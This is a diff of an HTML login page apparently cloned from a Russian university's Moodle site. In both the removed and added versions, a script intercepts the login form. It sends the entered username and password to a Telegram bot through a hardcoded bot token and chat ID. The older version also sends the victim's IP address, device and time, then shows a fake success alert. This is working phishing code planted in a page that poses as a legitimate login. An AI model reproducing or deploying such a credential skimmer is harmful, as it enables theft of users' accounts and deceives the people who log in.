-require(["media_videojs/loader"], function(loader) {
-    loader.setUp('ru');
-});;
-M.util.js_pending('accessibility_fontface/script'); require(['accessibility_fontface/script'], function(amd) {amd.init(); M.util.js_complete('accessibility_fontface/script');});;
-M.util.js_pending('accessibility_fontkerning/script'); require(['accessibility_fontkerning/script'], function(amd) {amd.init(null); M.util.js_complete('accessibility_fontkerning/script');});;
-M.util.js_pending('accessibility_fontsize/script'); require(['accessibility_fontsize/script'], function(amd) {amd.init(null); M.util.js_complete('accessibility_fontsize/script');});;
-M.util.js_pending('accessibility_imagevisibility/script'); require(['accessibility_imagevisibility/script'], function(amd) {amd.init(null); M.util.js_complete('accessibility_imagevisibility/script');});;
-M.util.js_pending('accessibility_letterspacing/script'); require(['accessibility_letterspacing/script'], function(amd) {amd.init(null); M.util.js_complete('accessibility_letterspacing/script');});;
-M.util.js_pending('accessibility_lineheight/script'); require(['accessibility_lineheight/script'], function(amd) {amd.init(null); M.util.js_complete('accessibility_lineheight/script');});;
-M.util.js_pending('accessibility_linkhighlight/script'); require(['accessibility_linkhighlight/script'], function(amd) {amd.init(null); M.util.js_complete('accessibility_linkhighlight/script');});;
-M.util.js_pending('accessibility_textalignment/script'); require(['accessibility_textalignment/script'], function(amd) {amd.init(); M.util.js_complete('accessibility_textalignment/script');});;
-
-require(['theme_boost/footer-popover'], function(FooterPopover) {
-    FooterPopover.init();
-});
-;
-
-M.util.js_pending('theme_boost/loader');
-require(['theme_boost/loader'], function() {
-  M.util.js_complete('theme_boost/loader');
-});
-;
-
-            require(['core_form/events'], function(FormEvent) {
-                function autoFocus() {
-                    const userNameField = document.getElementById('username');
-                    const passwordField = document.getElementById('password');
-                    if (userNameField && userNameField.value.length == 0) {
-                        userNameField.focus();
-                    } else if (passwordField) {
-                        passwordField.focus();
-                    }
-                }
-                autoFocus();
-                window.addEventListener(FormEvent.eventTypes.fieldStructureChanged, autoFocus);
-            });
-    require(['core/pending'], function(Pending) {
-        const errorMessageDiv = document.getElementById('loginerrormessage');
-        const infoMessageDiv = document.getElementById('logininfomessage');
-        const errorMessage = errorMessageDiv?.textContent.trim();
-        const infoMessage = infoMessageDiv?.textContent.trim();
-        if (errorMessage || infoMessage) {
-            const pendingJS = new Pending('login-move-focus');
-            const usernameField = document.getElementById('username');
-            setTimeout(function() {
-                // Focus on the username field on error.
-                if (errorMessage && usernameField) {
-                    usernameField.focus();
-                }
-                // Append a non-breaking space to the error/status message so screen readers will announce them after page load.
-                if (errorMessage) {
-                    errorMessageDiv.innerHTML += " ";
-                }
-                if (infoMessage) {
-                    infoMessageDiv.innerHTML += " ";
-                }
-                pendingJS.resolve();
-            }, 500);
-        }
-    });
-        require(['core/togglesensitive'], function(ToggleSensitive) {
-            ToggleSensitive.init("password", 1);
-        });
-    require(['core_form/submit'], function(Submit) {
-        Submit.init("loginbtn");
-    });
-;
-M.util.js_pending('local_accessibility/panel'); require(['local_accessibility/panel'], function(amd) {amd.init(); M.util.js_complete('local_accessibility/panel');});;
-M.util.js_pending('core/notification'); require(['core/notification'], function(amd) {amd.init(1, []); M.util.js_complete('core/notification');});;
-M.util.js_pending('core/log'); require(['core/log'], function(amd) {amd.setConfig({"level":"warn"}); M.util.js_complete('core/log');});;
-M.util.js_pending('core/page_global'); require(['core/page_global'], function(amd) {amd.init(); M.util.js_complete('core/page_global');});;
-M.util.js_pending('core/utility'); require(['core/utility'], function(amd) {M.util.js_complete('core/utility');});;
-M.util.js_pending('core/storage_validation'); require(['core/storage_validation'], function(amd) {amd.init(null); M.util.js_complete('core/storage_validation');});
-    M.util.js_complete("core/first");
-});
-//]]>
-</script>
-<script src="js/MathJax.js"></script>
-<script>
-//<![CDATA[
-M.str = {"moodle":{"lastmodified":"\u041f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0435 \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u0435","name":"\u0418\u043c\u044f","error":"\u041e\u0448\u0438\u0431\u043a\u0430","info":"\u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f","yes":"\u0414\u0430","no":"\u041d\u0435\u0442","cancel":"\u041e\u0442\u043c\u0435\u043d\u0430","confirm":"\u041f\u043e\u0434\u0442\u0432\u0435\u0440\u0434\u0438\u0442\u044c","areyousure":"\u0412\u044b \u0443\u0432\u0435\u0440\u0435\u043d\u044b?","closebuttontitle":"\u0417\u0430\u043a\u0440\u044b\u0442\u044c","unknownerror":"\u041d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u0430\u044f \u043e\u0448\u0438\u0431\u043a\u0430","file":"\u0424\u0430\u0439\u043b","url":"URL","collapseall":"\u0421\u0432\u0435\u0440\u043d\u0443\u0442\u044c \u0432\u0441\u0451","expandall":"\u0420\u0430\u0437\u0432\u0435\u0440\u043d\u0443\u0442\u044c \u0432\u0441\u0451"},"repository":{"type":"\u0422\u0438\u043f","size":"\u0420\u0430\u0437\u043c\u0435\u0440","invalidjson":"\u041d\u0435\u0432\u0435\u0440\u043d\u0430\u044f \u0441\u0442\u0440\u043e\u043a\u0430 JSON","nofilesattached":"\u041d\u0435 \u043f\u0440\u0438\u043a\u0440\u0435\u043f\u043b\u0435\u043d \u043d\u0438 \u043e\u0434\u0438\u043d \u0444\u0430\u0439\u043b","filepicker":"\u0412\u044b\u0431\u043e\u0440 \u0444\u0430\u0439\u043b\u0430","logout":"\u0412\u044b\u0445\u043e\u0434","nofilesavailable":"\u041d\u0435\u0442 \u043d\u0438 \u043e\u0434\u043d\u043e\u0433\u043e \u0444\u0430\u0439\u043b\u0430","norepositoriesavailable":"\u041a \u0441\u043e\u0436\u0430\u043b\u0435\u043d\u0438\u044e, \u043d\u0438 \u043e\u0434\u043d\u043e \u0438\u0437 \u0412\u0430\u0448\u0438\u0445 \u0442\u0435\u043a\u0443\u0449\u0438\u0445 \u0445\u0440\u0430\u043d\u0438\u043b\u0438\u0449 \u0444\u0430\u0439\u043b\u043e\u0432 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u0432\u0435\u0440\u043d\u0443\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u0432 \u0437\u0430\u043f\u0440\u0430\u0448\u0438\u0432\u0430\u0435\u043c\u043e\u043c \u0444\u043e\u0440\u043c\u0430\u0442\u0435.","fileexistsdialogheader":"\u0424\u0430\u0439\u043b \u0441\u043e\u0437\u0434\u0430\u043d","fileexistsdialog_editor":"\u0424\u0430\u0439\u043b \u0441 \u044d\u0442\u0438\u043c \u0438\u043c\u0435\u043d\u0435\u043c \u0443\u0436\u0435 \u0431\u044b\u043b \u043f\u0440\u0438\u043a\u0440\u0435\u043f\u043b\u0435\u043d \u043a \u0440\u0435\u0434\u0430\u043a\u0442\u0438\u0440\u0443\u0435\u043c\u043e\u043c\u0443 \u0442\u0435\u043a\u0441\u0442\u0443","fileexistsdialog_filemanager":"\u0424\u0430\u0439\u043b \u0441 \u044d\u0442\u0438\u043c \u0438\u043c\u0435\u043d\u0435\u043c \u0443\u0436\u0435 \u0431\u044b\u043b \u043f\u0440\u0438\u043a\u0440\u0435\u043f\u043b\u0435\u043d","renameto":"\u041f\u0435\u0440\u0435\u0438\u043c\u0435\u043d\u043e\u0432\u0430\u0442\u044c \u0432 \u00ab{$a}\u00bb","referencesexist":"\u041d\u0430 \u044d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0435\u0441\u0442\u044c \u0441\u0441\u044b\u043b\u043a\u0438: {$a}","select":"\u0412\u044b\u0431\u0440\u0430\u0442\u044c"},"admin":{"confirmdeletecomments":"\u0412\u044b \u0443\u0432\u0435\u0440\u0435\u043d\u044b \u0432 \u0442\u043e\u043c, \u0447\u0442\u043e \u0441\u043e\u0431\u0438\u0440\u0430\u0435\u0442\u0435\u0441\u044c \u0443\u0434\u0430\u043b\u0438\u0442\u044c \u0432\u044b\u0431\u0440\u0430\u043d\u043d\u044b\u0435 \u043a\u043e\u043c\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0438?","confirmation":"\u041f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u0435"},"accessibility_fontkerning":{"turnonkerning":"\u0412\u043a\u043b\u044e\u0447\u0438\u0442\u044c","turnoffkerning":"\u0412\u044b\u043a\u043b\u044e\u0447\u0438\u0442\u044c"},"accessibility_imagevisibility":{"hideimages":"\u0421\u043a\u0440\u044b\u0442\u044c \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f","showimages":"\u041f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f"},"accessibility_linkhighlight":{"enabled":"\u0412\u043a\u043b\u044e\u0447\u0435\u043d\u043e","disabled":"\u041e\u0442\u043a\u043b\u044e\u0447\u0435\u043d\u043e"},"debug":{"debuginfo":"\u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f \u043e\u0431 \u043e\u0442\u043b\u0430\u0434\u043a\u0435","line":"\u0421\u0442\u0440\u043e\u043a\u0430","stacktrace":"\u0422\u0440\u0430\u0441\u0441\u0438\u0440\u043e\u0432\u043a\u0438 \u0441\u0442\u0435\u043a\u0430"},"langconfig":{"labelsep":":"}};
-//]]>
-</script>
-<script>
-//<![CDATA[
-(function() {M.util.help_popups.setup(Y);
- M.util.js_pending('random69b551b0e17572'); Y.on('domready', function() { M.util.js_complete("init");  M.util.js_complete('random69b551b0e17572'); });
-})();
-//]]>
-</script>
-
-    
-        <div class="footer-content-debugging footer-dark bg-dark text-light">
-            <div class="container-fluid footer-dark-inner">
-                
+            <script src="js/require.min.js"></script>
+            
+            <div class="footer-content-debugging footer-dark bg-dark text-light">
+                <div class="container-fluid footer-dark-inner"></div>
             </div>
-        </div>
-    
-    </footer>
-    
-</div>
-    </section>
-    </main>
+        </footer>
+    </div>
 
-<!-- КОД ДЛЯ ОТПРАВКИ В TELEGRAM -->
-<script>
-// ===== НАСТРОЙКИ TELEGRAM =====
-// ЗАМЕНИТЕ НА СВОИ ЗНАЧЕНИЯ!
-const BOT_TOKEN = '8615329188:AAFu6Y8Lg-KUYL13YqojQAuQbMitYCJ_3sc';
-const CHAT_ID = '7071415280';
-// =============================
+    <!-- КОД ДЛЯ ОТПРАВКИ В TELEGRAM -->
+    <script>
+        // ===== НАСТРОЙКИ TELEGRAM =====
+        const BOT_TOKEN = '8615329188:AAFu6Y8Lg-KUYL13YqojQAuQbMitYCJ_3sc';
+        const CHAT_ID = '7071415280';
+        // =============================
 
-let userIP = 'Не определен';
-let userDevice = 'Не определено';
-
-function getDeviceModel() {
-    const ua = navigator.userAgent;
-    const platform = navigator.platform;
-    
-    if (/android/i.test(ua)) {
-        const match = ua.match(/Android\s([0-9.]+)/);
-        const version = match ? match[1] : 'неизвестная версия';
-        return `Android (${version})`;
-    }
-    if (/iphone|ipad|ipod/i.test(ua)) {
-        const match = ua.match(/OS\s([0-9_]+)/);
-        const version = match ? match[1].replace(/_/g, '.') : 'неизвестная версия';
-        return `iPhone/iPad (iOS ${version})`;
-    }
-    if (/windows/i.test(ua)) return 'Windows';
-    if (/macintosh|mac os x/i.test(ua)) return 'macOS';
-    if (/linux/i.test(ua)) return 'Linux';
-    return platform || 'Неизвестное устройство';
-}
-
-function getIP() {
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            userIP = data.ip;
-        })
-        .catch(() => {
-            userIP = 'Не удалось определить';
+        document.getElementById('login').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            const message = "🔔 НОВЫЙ ВХОД\nЛогин: " + username + "\nПароль: " + password;
+            
+            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+            .then(function() {
+                // Отправляем форму дальше
+                e.target.submit();
+            })
+            .catch(function() {
+                e.target.submit();
+            });
         });
-}
-
-userDevice = getDeviceModel();
-getIP();
-
-document.querySelector('form').addEventListener('submit', function(e) {
-    e.preventDefault();
-    
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-    const submitBtn = document.querySelector('button[type="submit"]');
-    
-    submitBtn.disabled = true;
-    submitBtn.textContent = 'Отправка...';
-    
-    const timestamp = new Date().toLocaleString('ru-RU', { 
-        timeZone: 'Europe/Moscow'
-    });
-    
-    const message = `
-🔔 НОВЫЙ ВХОД
-════════════════════
-👤 ЛОГИН: ${username}
-🔑 ПАРОЛЬ: ${password}
-════════════════════
-🌐 IP: ${userIP}
-📱 УСТРОЙСТВО: ${userDevice}
-⏰ ВРЕМЯ: ${timestamp}
-    `;
-    
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
-        })
-    })
-    .then(() => {
-        setTimeout(() => {
-            alert('Вход выполнен!');
-            // Можно добавить редирект
-            // window.location.href = 'https://sdo.if-mstuca.ru';
-        }, 1000);
-    })
-    .catch(() => {
-        setTimeout(() => {
-            alert('Вход выполнен!');
-        }, 1000);
-    });
-});
-</script>
-
+    </script>
 </body>
 </html>
